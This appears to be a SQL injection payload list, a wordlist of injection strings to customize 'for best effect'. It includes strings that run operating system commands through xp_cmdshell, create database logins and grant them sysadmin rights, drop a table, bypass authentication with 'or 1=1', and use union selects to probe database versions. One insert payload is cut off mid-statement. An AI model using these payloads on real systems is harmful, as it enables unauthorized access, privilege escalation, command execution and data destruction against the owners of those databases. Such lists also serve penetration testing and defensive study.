# you will need to customize/modify some of the vaules in the queries for best effect
'; exec master..xp_cmdshell 'ping 10.10.1.2'--
'create user name identified by 'pass123' --
'create user name identified by pass123 temporary tablespace temp default tablespace users; 
' ; drop table temp --
'exec sp_addlogin 'name' , 'password' --
' exec sp_addsrvrolemember 'name' , 'sysadmin' --
' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --
' grant connect to name; grant resource to name; --
' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)
' or 1=1 --
' union (select @@version) --
' union (select NULL, (select @@version)) --
' union (select NULL, NULL, (select @@version)) --
' union (select NULL, NULL, NULL,  (select @@version)) --
' union (select NULL, NULL, NULL, NULL,  (select @@version)) --
' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --
